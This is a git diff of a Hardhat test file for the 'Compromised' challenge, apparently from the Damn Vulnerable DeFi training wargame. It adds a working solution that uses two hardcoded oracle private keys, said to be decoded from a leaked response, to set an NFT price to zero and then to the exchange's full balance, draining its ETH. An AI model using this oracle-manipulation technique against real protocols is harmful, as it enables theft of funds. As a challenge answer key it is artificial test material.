@@ -1,7 +1,7 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 
-describe('Compromised challenge', function () {
+describe('Compromised challenge', function() {
 
     const sources = [
         '0xA73209FB1a42495120166736362A1DfA9F95A105',
@@ -13,7 +13,7 @@ describe('Compromised challenge', function () {
     const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
     const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
 
-    before(async function () {
+    before(async function() {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
@@ -45,37 +45,56 @@ describe('Compromised challenge', function () {
         // Deploy the oracle and setup the trusted sources with initial prices
         this.oracle = await TrustfulOracleFactory.attach(
             await (await TrustfulOracleInitializerFactory.deploy(
-                sources,
-                ["DVNFT", "DVNFT", "DVNFT"],
-                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
+                sources, ["DVNFT", "DVNFT", "DVNFT"], [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
             )).oracle()
         );
 
         // Deploy the exchange and get the associated ERC721 token
         this.exchange = await ExchangeFactory.deploy(
-            this.oracle.address,
-            { value: EXCHANGE_INITIAL_ETH_BALANCE }
+            this.oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE }
         );
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function() {
         /** CODE YOUR EXPLOIT HERE */
+
+        // hex in html response -> utf8 (base64) -> utf8 (hex)
+        let orcale_1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        let orcale_2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+        // use the orcale's wallet to set the price to 0
+        await this.oracle.connect(orcale_1).postPrice("DVNFT", 0);
+        await this.oracle.connect(orcale_2).postPrice("DVNFT", 0);
+
+        // buy 1 DVNFT
+        await this.exchange.connect(attacker).buyOne({ value: 1 });
+
+        // set DVNFT price to exchange balance and sell it
+        await this.oracle.connect(orcale_1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(orcale_2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // revert to init price
+        await this.oracle.connect(orcale_1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(orcale_2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
-    after(async function () {
+    after(async function() {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.eq('0');
-        
+
         // Attacker's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Attacker must not own any NFT
         expect(
             await this.nftToken.balanceOf(attacker.address)
